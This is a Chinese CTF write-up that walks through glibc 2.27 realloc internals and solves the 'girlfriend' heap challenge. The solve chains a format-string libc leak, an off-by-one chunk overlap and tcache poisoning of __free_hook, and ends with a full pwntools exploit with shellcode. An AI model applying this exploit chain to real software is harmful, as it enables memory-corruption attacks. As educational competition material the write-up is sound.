# 从广东省强网杯——girlfriend中看realloc的艺术

阅读量 **265498**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-03 16:30:19

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01c7e7d8dbe719439d.jpg)

>
> 很早就得知`realloc`一些特殊的作用，但一直以来都是硬套，导致有时候并不能很快的反应过来（太菜了…），所以在赛后对`realloc`做个整理，如果感兴趣的话就一起看下去吧！

## realloc分析

首先先通过源码来进行分析，下面的`libc-2.27`的`realloc`的源码，此函数位于`glibc-2.27-master\malloc\malloc.c`，为了更好理解删除了一些代码：

    
    
    void *
    __libc_realloc (void *oldmem, size_t bytes)
    {
      mstate ar_ptr;
      INTERNAL_SIZE_T nb;         /* padded request size */
    
      void *newp;             /* chunk to return */
    
      void *(*hook) (void *, size_t, const void *) =
        atomic_forced_read (__realloc_hook);
      if (__builtin_expect (hook != NULL, 0))
        return (*hook)(oldmem, bytes, RETURN_ADDRESS (0));
    
    #if REALLOC_ZERO_BYTES_FREES
      if (bytes == 0 && oldmem != NULL)
        {
          __libc_free (oldmem); return 0;
        }
    #endif
    
      /* realloc of null is supposed to be same as malloc */
      if (oldmem == 0)
        return __libc_malloc (bytes);
    
      /* chunk corresponding to oldmem */
      const mchunkptr oldp = mem2chunk (oldmem);
      /* its size */
      const INTERNAL_SIZE_T oldsize = chunksize (oldp);
    
      if (chunk_is_mmapped (oldp))
        ar_ptr = NULL;
      else
        {
          MAYBE_INIT_TCACHE ();
          ar_ptr = arena_for_chunk (oldp);
        }
    
      if ((__builtin_expect ((uintptr_t) oldp > (uintptr_t) -oldsize, 0)
           || __builtin_expect (misaligned_chunk (oldp), 0))
          && !DUMPED_MAIN_ARENA_CHUNK (oldp))
          malloc_printerr ("realloc(): invalid pointer");
    
      checked_request2size (bytes, nb);
    
      if (chunk_is_mmapped (oldp))
        {
          /* If this is a faked mmapped chunk from the dumped main arena,
         always make a copy (and do not free the old chunk).  */
          if (DUMPED_MAIN_ARENA_CHUNK (oldp))
        {
          /* Must alloc, copy, free. */
          void *newmem = __libc_malloc (bytes);
          if (newmem == 0)
            return NULL;
          /* Copy as many bytes as are available from the old chunk
             and fit into the new size.  NB: The overhead for faked
             mmapped chunks is only SIZE_SZ, not 2 * SIZE_SZ as for
             regular mmapped chunks.  */
          if (bytes > oldsize - SIZE_SZ)
            bytes = oldsize - SIZE_SZ;
          memcpy (newmem, oldmem, bytes);
          return newmem;
        }
    
          void *newmem;
          /* Note the extra SIZE_SZ overhead. */
          if (oldsize - SIZE_SZ >= nb)
            return oldmem;                         /* do nothing */
    
          /* Must alloc, copy, free. */
          newmem = __libc_malloc (bytes);
          if (newmem == 0)
            return 0;              /* propagate failure */
    
          memcpy (newmem, oldmem, oldsize - 2 * SIZE_SZ);
          munmap_chunk (oldp);
          return newmem;
        }
    
      if (SINGLE_THREAD_P)
        {
          newp = _int_realloc (ar_ptr, oldp, oldsize, nb);
          assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||
              ar_ptr == arena_for_chunk (mem2chunk (newp)));
    
          return newp;
        }
    
      __libc_lock_lock (ar_ptr->mutex);
    
      newp = _int_realloc (ar_ptr, oldp, oldsize, nb);
    
      __libc_lock_unlock (ar_ptr->mutex);
      assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||
              ar_ptr == arena_for_chunk (mem2chunk (newp)));
    
      if (newp == NULL)
        {
          /* Try harder to allocate memory in other arenas.  */
          LIBC_PROBE (memory_realloc_retry, 2, bytes, oldmem);
          newp = __libc_malloc (bytes);
          if (newp != NULL)
            {
              memcpy (newp, oldmem, oldsize - SIZE_SZ);
              _int_free (ar_ptr, oldp, 0);
            }
        }
    
      return newp;
    }
    libc_hidden_def (__libc_realloc)
    

它和`malloc`和`free`都有同样的特性，就是当`xxx_hook`不为空的时候去执行存放在`xxx_hook`里面的函数，熟悉`realloc`调整栈帧的师傅应该都明白这个，并且还利用了`__builtin_expect`来优化，具体可以看下面的链接：

[__builtin_expect详解](https://blog.csdn.net/GrubLinux/article/details/37543489)

    
    
      void *(*hook) (void *, size_t, const void *) =
        atomic_forced_read (__realloc_hook);
      if (__builtin_expect (hook != NULL, 0))
        return (*hook)(oldmem, bytes, RETURN_ADDRESS (0));
    

下面的代码就是它的特性之一，查找定义得知`#define REALLOC_ZERO_BYTES_FREES
1`，所以当`bytes`（也就是size）为0，且`oldmem`不为空的时候就执行`__libc_free`，同时`return 0`

    
    
    #if REALLOC_ZERO_BYTES_FREES
      if (bytes == 0 && oldmem != NULL)
        {
          __libc_free (oldmem); return 0;
        }
    #endif
    

`__libc_free`先进行一些检查，之后就进入`_int_free`里面，也就是平常所说到的`free`函数，也就是说`realloc`在某些特性情况下是可以充当`free`函数来使用的！其实也很好理解，就是重新调整堆块的大小为0，那既然堆块的大小都为0了，不就等于`free`了吗？

    
    
    void
    __libc_free (void *mem)
    {
      mstate ar_ptr;
      mchunkptr p;                          /* chunk corresponding to mem */
    
      void (*hook) (void *, const void *)
        = atomic_forced_read (__free_hook);
      if (__builtin_expect (hook != NULL, 0))
        {
          (*hook)(mem, RETURN_ADDRESS (0));
          return;
        }
    
      if (mem == 0)                              /* free(0) has no effect */
        return;
    
      p = mem2chunk (mem);
    
      if (chunk_is_mmapped (p))                       /* release mmapped memory. */
        {
          /* See if the dynamic brk/mmap threshold needs adjusting.
         Dumped fake mmapped chunks do not affect the threshold.  */
          if (!mp_.no_dyn_threshold
              && chunksize_nomask (p) > mp_.mmap_threshold
              && chunksize_nomask (p) <= DEFAULT_MMAP_THRESHOLD_MAX
          && !DUMPED_MAIN_ARENA_CHUNK (p))
            {
              mp_.mmap_threshold = chunksize (p);
              mp_.trim_threshold = 2 * mp_.mmap_threshold;
              LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,
                          mp_.mmap_threshold, mp_.trim_threshold);
            }
          munmap_chunk (p);
          return;
        }
    
      MAYBE_INIT_TCACHE ();
    
      ar_ptr = arena_for_chunk (p);
      _int_free (ar_ptr, p, 0);
    }
    

通过一个`demo`来加深一下印象

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    int main(void){
        void *p;
        p = malloc(0x10);
        realloc(p,0);
        return 0;
    }
    //gcc realloc.c -o realloc -no-pie
    

`gdb`在`main`函数下断点之后单步走完`call malloc[@plt](https://github.com/plt "@plt")
<malloc[@plt](https://github.com/plt "@plt")>`，可以看到正常的创建了一个堆块：

![](https://p1.ssl.qhimg.com/t0177838a304045b75c.png)

再往下走完`call realloc[@plt](https://github.com/plt "@plt")
<realloc[@plt](https://github.com/plt "@plt")>`，再次查看的时候，它已经被`free`了：

![](https://p0.ssl.qhimg.com/t0111d49c6f735face8.png)

往下走就是另一个特性，当`oldmem`为0，就调用`__libc_malloc`，也就是平时所说的`malloc`函数的入口：

    
    
    if (oldmem == 0)
        return __libc_malloc (bytes);
    

稍微改一下上面的`demo`来重新验证一下：

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    int main(void){
    
        void *p,*q;
        p = malloc(0x10);
        realloc(q,0x10);
        return 0;
    }
    //gcc realloc.c -o realloc -no-pie
    

调试过程和上面的一样，结果同样没有任何毛病：

![](https://p4.ssl.qhimg.com/t013f5f0f14568d2afe.png)

再往下就是`mmap`的分配方式，本文重点不在此出，直接看下面的`_int_realloc`

    
    
    newp = _int_realloc (ar_ptr, oldp, oldsize, nb);
    

下面是 `_int_realloc`的源码，已经做好了注释：

    
    
    void*
    _int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize,
             INTERNAL_SIZE_T nb)
    {
      //首先是检查oldmem size和next chunk的大小是否合法
      if (__builtin_expect (chunksize_nomask (oldp) <= 2 * SIZE_SZ, 0)
          || __builtin_expect (oldsize >= av->system_mem, 0))
        malloc_printerr ("realloc(): invalid old size");
    
      check_inuse_chunk (av, oldp);
    
      assert (!chunk_is_mmapped (oldp));
    
      next = chunk_at_offset (oldp, oldsize);
      INTERNAL_SIZE_T nextsize = chunksize (next);
      if (__builtin_expect (chunksize_nomask (next) <= 2 * SIZE_SZ, 0)
          || __builtin_expect (nextsize >= av->system_mem, 0))
        malloc_printerr ("realloc(): invalid next size");
    
      //判断oldsize是不是已经大于要分配的
      if ((unsigned long) (oldsize) >= (unsigned long) (nb))
        {
          newp = oldp;
          newsize = oldsize;
        }
    
      else
        {
          //如果堆块和top chunk相邻，就直接从top chunk中分割出来
          if (next == av->top &&
              (unsigned long) (newsize = oldsize + nextsize) >=
              (unsigned long) (nb + MINSIZE))
            {
              set_head_size (oldp, nb | (av != &main_arena ? NON_MAIN_ARENA : 0));
              av->top = chunk_at_offset (oldp, nb);
              set_head (av->top, (newsize - nb) | PREV_INUSE);
              check_inuse_chunk (av, oldp);
              return chunk2mem (oldp);
            }
    
          //如果下一个堆块是空闲的且大小合适，就直接将它两个合并成一个大的堆块
          else if (next != av->top &&
                   !inuse (next) &&
                   (unsigned long) (newsize = oldsize + nextsize) >=
                   (unsigned long) (nb))
            {
              newp = oldp;
              unlink (av, next, bck, fwd);
            }
    
          /*如果又没有和top chunk相邻，下一个堆块也不合适，就直接malloc出来一个，并将原堆块的内容复制过去，最后把原来的堆块free掉*/
          else
            {
              newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);
              if (newmem == 0)
                return 0; /* propagate failure */
    
              newp = mem2chunk (newmem);
              newsize = chunksize (newp);
    
              /*
                 Avoid copy if newp is next chunk after oldp.
              */
              if (newp == next)
                {
                  newsize += oldsize;
                  newp = oldp;
                }
              else
                {
                  copysize = oldsize - SIZE_SZ;
                  s = (INTERNAL_SIZE_T *) (chunk2mem (oldp));
                  d = (INTERNAL_SIZE_T *) (newmem);
                  ncopies = copysize / sizeof (INTERNAL_SIZE_T);
                  assert (ncopies >= 3);
    
                  if (ncopies > 9)
                    memcpy (d, s, copysize);
    
                  else
                    {
                      *(d + 0) = *(s + 0);
                      *(d + 1) = *(s + 1);
                      *(d + 2) = *(s + 2);
                      if (ncopies > 4)
                        {
                          *(d + 3) = *(s + 3);
                          *(d + 4) = *(s + 4);
                          if (ncopies > 6)
                            {
                              *(d + 5) = *(s + 5);
                              *(d + 6) = *(s + 6);
                              if (ncopies > 8)
                                {
                                  *(d + 7) = *(s + 7);
                                  *(d + 8) = *(s + 8);
                                }
                            }
                        }
                    }
    
                  _int_free (av, oldp, 1);
                  check_inuse_chunk (av, newp);
                  return chunk2mem (newp);
                }
            }
        }
      //整理一些额外的空间
    
      assert ((unsigned long) (newsize) >= (unsigned long) (nb));
    
      remainder_size = newsize - nb;
    
      if (remainder_size < MINSIZE)   /* not enough extra to split off */
        {
          set_head_size (newp, newsize | (av != &main_arena ? NON_MAIN_ARENA : 0));
          set_inuse_bit_at_offset (newp, newsize);
        }
      else   /* split remainder */
        {
          remainder = chunk_at_offset (newp, nb);
          set_head_size (newp, nb | (av != &main_arena ? NON_MAIN_ARENA : 0));
          set_head (remainder, remainder_size | PREV_INUSE |
                    (av != &main_arena ? NON_MAIN_ARENA : 0));
          /* Mark remainder as inuse so free() won't complain */
          set_inuse_bit_at_offset (remainder, remainder_size);
          _int_free (av, remainder, 1);
        }
    
      check_inuse_chunk (av, newp);
      return chunk2mem (newp);
    }
    

我们来重点看一下这一段代码：

    
    
    //如果下一个堆块是空闲的且大小合适，就直接将它两个合并成一个大的堆块
    else if (next != av->top &&
             !inuse (next) &&
             (unsigned long) (newsize = oldsize + nextsize) >=
             (unsigned long) (nb))
    {
        newp = oldp;
        unlink (av, next, bck, fwd);
    }
    

例题就是利用这点来做堆叠的，为什么这么说呢？思考如下场景，如果`chunk1`存在堆溢出可以修改到`chunk2`的`size`，在这里假设改成0x221，那么下次再申请0x200的大小的时候，`chunk2`的堆块就会被申请到，但是此时的`chunk2`的`size`已经变成了0x220，也就是说`chunk2`里面还有0x20大小没分配出去，所以当我再次去扩大它的大小的时候就会像上面的那段代码一样直接将下一个堆块合并，也就是吞并了下一个堆块0x20的大小，就拥有了修改它`fd`指针的能力！

![](https://p1.ssl.qhimg.com/t0186b143bb0d956202.png)

如果还不是很明白，再通过几张图片来巩固一下：

  1. 首先修改`chunk2`的`size`为0x221，它将把下一个`chunk`的`head`包括进去：

![](https://p1.ssl.qhimg.com/t0177f886a2aadda630.png)

2.申请0x200的大小：

![](https://p3.ssl.qhimg.com/t01b35036a7c4f15050.png)

3.对`chunk2`进行扩充：

![](https://p2.ssl.qhimg.com/t018766524b3a4a854c.png)

下面是最后一个特性，当对`newp`没有成功的扩充的时候（即`bin`中没有合适的堆块），会直接重新分配一个新的堆块，并将原来堆块的内容复制到新的堆块当中，再将原来的堆块`free`掉

    
    
    newp = _int_realloc (ar_ptr, oldp, oldsize, nb);
    ...
    if (newp == NULL)
        {
          LIBC_PROBE (memory_realloc_retry, 2, bytes, oldmem);
          newp = __libc_malloc (bytes);
          if (newp != NULL)
            {
              memcpy (newp, oldmem, oldsize - SIZE_SZ);
              _int_free (ar_ptr, oldp, 0);
         }
    }
    

####  小结

  * 当`size`为0，就等于`free()`函数，同时返回值为NULL
  * 当指针为0，`size`大于0，就等于`malloc()`函数
  * `size`小于等于原来的`size`，则在原堆块上缩小，多余的大小`free()`掉
  * `size`大于原来的`size`，如果`bin`中有多余的堆块就进行扩充，没有多余的堆块则重新分配新的堆块，并将内容复制到新的堆块中，然后再将原来的堆块`free()`掉

## 广东省强网杯—girlfriend

####  基本分析

    
    
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
    

保护全开，同时还开启了`FORTIFY`来检测格式化字符串漏洞，只能打`xxx_hook`来`getshell`或者`orw`

###  IDA分析

IDA打开，满满的全是画指令，去除方法如下：

选中下面的画指令的开头，选择菜单`Edit -> Patch program ->
Assamble`，将下面的画指令全部改成`nop`，之后回到函数的开头，对着函数名按下`u`和`p`，也就是让`IDA`重新分析此处，其他地方如法炮制，全部修改完成之后就可以正常的`f5`啦！（有些地方是需要重新选中再进行重新分析的，也就是从它开始到`sub_xxx
endp`的地方）

    
    
    call    $+5
    add     [rsp+18h+var_18], 6
    retn
    

修复完之后，开头就是沙箱，那基本思路就定调了，就是泄露`libc`->劫持`xxx_hook`为`setcontext+53`进行栈迁移，最后再进行`orw`！（为了阅读方便已经为部分函数重命名了）

    
    
    __int64 seccomp()
    {
      __int64 v1; // [rsp+8h] [rbp-8h]
    
      v1 = seccomp_init(2147418112LL);
      seccomp_rule_add(v1, 0LL, 59LL, 0LL);
      return seccomp_load(v1);
    }
    

来到下一个函数，此函数询问`Do you have grilfriend ?`并给出两个选项，先来看看`v1 == N`里面的函数：

    
    
    int main_funtion()
    {
      int result; // eax
      int v1; // eax
      int i; // [rsp+8h] [rbp-8h]
    
      puts("============================");
      puts("====welcome to the game=====");
      result = puts("============================");
      for ( i = 0; i <= 1; ++i )
      {
        puts("\n");
        puts("Do you have grilfriend ? ");
        puts("\n");
        v1 = read_0();
        if ( v1 == 'N' )
        {
          puts("what a bad mood++++");
          result = backdoor();
        }
        else
        {
          if ( v1 != 'Y' )
          {
            puts("invaild");
            exit(0);
          }
          chunk_prt = malloc(0x200uLL);
          puts("please buy gifts for her+++++");
          result = heap();
        }
      }
      return result;
    }
    

可以看到里面存在格式化字符串漏洞，之前讲到它开启了`FORTIFY`来检测，但是还是有办法绕过的！

    
    
    unsigned __int64 sub_EA6()
    {
      char buf[24]; // [rsp+0h] [rbp-20h] BYREF
      unsigned __int64 v2; // [rsp+18h] [rbp-8h]
    
      v2 = __readfsqword(0x28u);
      puts("why ? reason");
      read(0, buf, 5uLL);
      __printf_chk(1LL, buf, 0LL, 0LL, 0LL, 0LL);
      puts("new a grilfriend");
      heap();
      return __readfsqword(0x28u) ^ v2;
    }
    

先看看`FORTIFY`是怎么样来保护的：

![](https://p4.ssl.qhimg.com/t01496da1f89be63915.png)

就是说定义此宏会导致执行一些轻量级检查，以在使用各种字符串和内存操作函数（例如`memcpy`，`memset`、`stpcpy`、`strcpy`、`strncpy`、`strcat`、`strncat`、`sprintf`、`snprintf`、`vsprintf`、
`vsnprintf`、`gets`、 及其宽字符变体）时检测一些缓冲区溢出错误

比如`printf`就变成了`printf_chk`，它将可以检查格式化字符串漏洞的特殊字符，就像下面这样

![](https://p0.ssl.qhimg.com/t019c75a7100ade3c01.png)

但它真的不能被利用吗？答案肯定是：否！既然不能用`%x$p`，那`%p`呢，实验之后确实可以，但它才往`buf`里面读入5个字节，也就是意味着只能输入`%p%p`就不能再输入了，尝试之后并不能泄露任何地址（泄露出两个`nul`）

![](https://p2.ssl.qhimg.com/t014cdf9fd0bff35741.png)

既然它不限制`%()`，拿其他的试试，直到`%a`，泄露出了下面的内容，！成功获得`libc`：

![](https://p2.ssl.qhimg.com/t01e8782163c8b0b74d.png)

之后便进入`heap()`也就是堆的菜单，除了`New Paper`和`exit`之外还有两个选项，这个待会再看：

    
    
    __int64 heap()
    {
      __int64 result; // rax
    
      while ( 1 )
      {
        while ( 1 )
        {
          meun();
          // puts("1. New Paper");
          // puts("2. exit");
          result = (unsigned int)read_0();
          if ( (_DWORD)result == 2 )
            exit(0);
          if ( (int)result > 2 )
            break;
          if ( (_DWORD)result != 1 )
            goto LABEL_11;
          alloc();
        }
        if ( (_DWORD)result == 3 )
          return result;
        if ( (_DWORD)result == 4 )
          show();
        else
    LABEL_11:
          puts("invaild");
      }
    }
    

`exit`就没什么好看的了，看看`New Paper`，可以获得到的信息是：

  * 只能分配16个堆块，也就是说得再16次以内完成堆叠，实现修改`fd`指针
  * `chunk`的`size`受限，不过问题不是很大，但需要注意的是有个`!chunk_ptr`，按照刚刚的路走过来并没有分配堆块会导致退出：

![](https://p3.ssl.qhimg.com/t01f3431565538701eb.png)

  * 输入的`size`为`size + 1`，存在人为`off-by-one`漏洞

    
    
    __int64 alloc()
    {
      __int64 result; // rax
      int size; // [rsp+14h] [rbp-4h]
    
      result = chunk_num;
      if ( chunk_num <= 16 )    
      {
        puts("size");
        size = read_0();
        if ( size > 768 || size < 0 || !chunk_prt )        
          exit(0);
        *chunk_prt = realloc(*chunk_prt, size);
        if ( *chunk_prt )
        {
          if ( size )
          {
            puts("data");
            read(0, *chunk_prt, size + 1);
          }
        }
        result = ++chunk_num;
      }
      return result;
    }
    

通过上面的信息会发现如果题目在询问`Do you have grilfriend
?`的时候选择`N`（78的`ascii`码）是不能正常进入题目的，出题人还是很好心的😀，既然这样就换一条路，可以看到选择`Y`之后，它分配了0x200的堆块并赋值给了`chunk_ptr`，也就是说，现在可以成功进入题目了！但是很遗憾，`libc`的泄露泡汤了….，不要灰心，还有两个选项呢！

    
    
    if ( v1 != 89 )
    {
        puts("invaild");
        exit(0);
    }
    chunk_prt = malloc(0x200uLL);
    puts("please buy gifts for her+++++");
    result = heap();
    

选项3是`return`回去，回去之后发现`for ( i = 0; i <= 1; ++i
)`，`i`的循环次数为2，也就是说`return`回去并没有让程序退出，而是给了一个重新选择的机会！所以只要两个选项都选择一次，就能泄露`libc`并且正常进入题目！

    
    
    if ( result == 3 )
        return result;
    

这个函数其实就是`show`函数，并且有且仅有一次机会

    
    
    int sub_CE8()
    {
      if ( dword_20204C > 0 )
        return puts("no chance");
      puts(chunk_prt);
      return ++dword_20204C;
    }
    

泄露`libc`的任务已经完成，代码如下：

    
    
    io.recvuntil('Do you have grilfriend ? \n\n\n')    
    io.sendline('89')
    backdoor()
    io.sendline('78')
    io.sendline('%11a')//和%a是一个道理
    io.recvuntil('0x0.0')
    libc_base = int(io.recv(12),16)-0x3ec7e3
    print("[*] libc_base => "+hex(libc_base))
    

那接下来就是实现堆叠劫持`fd`指针，先`add`三个堆块，之前也讲到因为`realloc`的特性，所以必须`free`掉，否则将不能再把之前的堆块放入`bin`中，堆块的分布如下：

    
    
    add(0xf8,'1'*8)
    free()
    add(0x128,'2'*8)
    free()
    add(0x300,'3'*8)
    free()
    

![](https://p5.ssl.qhimg.com/t019fa2aba77455c5a3.png)

接下来申请0xf8的大小，由于比之前的大，所以会从堆块中查找可用的堆块，查找到0x100就分配出去了，同时`add`的时候存在`off-by-one`覆盖下个`chunk`的`size`为0x171，虽然后面的堆块识别不到了，但是无伤大雅

    
    
    add(0xf8,'a'*0xf8+"\x71")
    free()
    

![](https://p5.ssl.qhimg.com/t01860e7da6567fc47d.png)

接下来`add(0x128)`就会分配到之前的堆块然后再分配到之前被`off-by-one`的堆块，再次进行扩大就能控制到下个堆块的内容，如下表：

    
    
    add(0x128)
    free()
    add(0x160,'a'*0x120+p64(0)+p64(0x111)+p64(free_hook))
    
    
    
    pwndbg> x/200gx 0x56237735e270
    0x56237735e270:    0x6161616161616161    0x0000000000000171
    0x56237735e280:    0x6161616161616161    0x6161616161616161
    0x56237735e290:    0x6161616161616161    0x6161616161616161
    0x56237735e2a0:    0x6161616161616161    0x6161616161616161
    0x56237735e2b0:    0x6161616161616161    0x6161616161616161
    0x56237735e2c0:    0x6161616161616161    0x6161616161616161
    0x56237735e2d0:    0x6161616161616161    0x6161616161616161
    0x56237735e2e0:    0x6161616161616161    0x6161616161616161
    0x56237735e2f0:    0x6161616161616161    0x6161616161616161
    0x56237735e300:    0x6161616161616161    0x6161616161616161
    0x56237735e310:    0x6161616161616161    0x6161616161616161
    0x56237735e320:    0x6161616161616161    0x6161616161616161
    0x56237735e330:    0x6161616161616161    0x6161616161616161
    0x56237735e340:    0x6161616161616161    0x6161616161616161
    0x56237735e350:    0x6161616161616161    0x6161616161616161
    0x56237735e360:    0x6161616161616161    0x6161616161616161
    0x56237735e370:    0x6161616161616161    0x6161616161616161
    0x56237735e380:    0x6161616161616161    0x6161616161616161
    0x56237735e390:    0x6161616161616161    0x6161616161616161
    0x56237735e3a0:    0x0000000000000000    0x0000000000000111
    0x56237735e3b0:    0x00007f9854f008e8    0x000056237735d010        //free_hook
    0x56237735e3c0:    0x0000000000000000    0x0000000000000000
    

当再次`free`的时候，它就会进入`tache`，并且它的`fd`为`__free_hook`，如下图：

![](https://p3.ssl.qhimg.com/t0124232f99415e45ac.png)

再分配俩0x200的堆块就能够修改`__free_hook`，接下来的`orw`就是常规操作了，由于本文是聚焦`realloc`，就不做过多的介绍了，完整exp如下：

    
    
    from pwn import *
    
    context.arch='amd64'
    context.log_level = 'debug'
    context.os = 'linux'
    io = process('girlfriend')#,env={"LD_PRELOAD":"./libc.so.6"})
    # io = process('girlfriend')
    elf = ELF('girlfriend')
    libc = ELF('libc.so.6')
    
    def add(size,content='zyen'):
        io.sendlineafter('>> ', '1')
        io.sendlineafter('size',str(size))
        io.sendafter('data',content)
    
    def backdoor():
        io.sendlineafter('>> ', '3')
    
    def show():
        io.sendlineafter(">> ",'4')
    
    def free():
        io.sendlineafter('>> ', '1')
        io.sendlineafter('size',str(0))
    
    io.recvuntil('Do you have grilfriend ? \n\n\n')    
    io.sendline('89')
    backdoor()
    io.sendline('78')
    io.sendline('%11a')
    io.recvuntil('0x0.0')
    libc_base = int(io.recv(12),16)-0x3ec7e3
    print("[*] libc_base => "+hex(libc_base))
    free_hook = libc_base + libc.sym['__free_hook']
    print("[*] free_hook => "+hex(free_hook))
    setcontext = libc_base + libc.sym['setcontext']
    print("[*] setcontext => "+hex(setcontext))
    
    add(0xf8,'1'*8)
    free()
    add(0x128,'2'*8)
    free()
    add(0x200,'3'*8)
    free()
    add(0xf8,'a'*0xf8+"\x71")
    free()
    
    add(0x128)
    free()
    add(0x160,'a'*0x120+p64(0)+p64(0x111)+p64(free_hook))
    free()
    gdb.attach(io)
    add(0x200)
    free()
    
    shellcode = free_hook & 0xfffffffffffff000
    shell1 = '''
    xor rdi, rdi
    mov rsi, %d
    mov edx, 0x1000
    
    mov eax, 0; 
    syscall
    
    jmp rsi
    ''' % shellcode
    
    mprotect=libc_base+libc.sym['mprotect']
    payload = p64(setcontext+53) + p64(free_hook + 0x10) + asm(shell1)
    payload = payload.ljust(0x68,"\x00")
    payload+=p64(shellcode)#rdi
    payload+=p64(0x1000)#rsi
    payload = payload.ljust(0x88,"\x00")
    payload+=p64(4 | 2 | 1)#rdx
    payload = payload.ljust(0xa0,"\x00")
    payload+=p64(free_hook+8)
    payload+=p64(mprotect)
    add(0x200,payload)
    free()
    
    shell2='''
    mov  rax,0x67616c662f2e
    push rax
    mov  rdi,rsp
    mov  rsi,0x0
    xor  rdx,rdx
    mov  rax,0x2
    syscall
    
    mov  rdi,rax
    mov  rsi,rsp
    mov  rdx,1024
    mov  rax,0x0
    syscall
    
    mov  rdi,0x1
    mov  rsi,rsp
    mov  rdx,rax
    mov  rax,0x1
    syscall
    '''
    io.sendline(asm(shell2))
    io.interactive()
    

## 总结

文章尽管有仔细检查过，但也可能有些小问题，有问题欢迎大师傅们来指正，以前总对`realloc`的堆风水布置感到有点迷茫，甚至觉得它就是玄学出来的，但其实完整的看看它的源码就会发现，其实每一步的结果都是和源码息息相关的，最后感谢您看到这，如果您看到这，相信你对`realloc`也有一定的理解了！！！

参考链接：

[广东省强网杯团队赛pwn](https://r1nd0.github.io/2021/10/14/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9Bpwn-wp/)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **12138** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/256793](/post/id/256793)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __3赞

 __收藏

![](https://p4.ssl.qhimg.com/t016581f380c5023b76.jpg) 12138

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

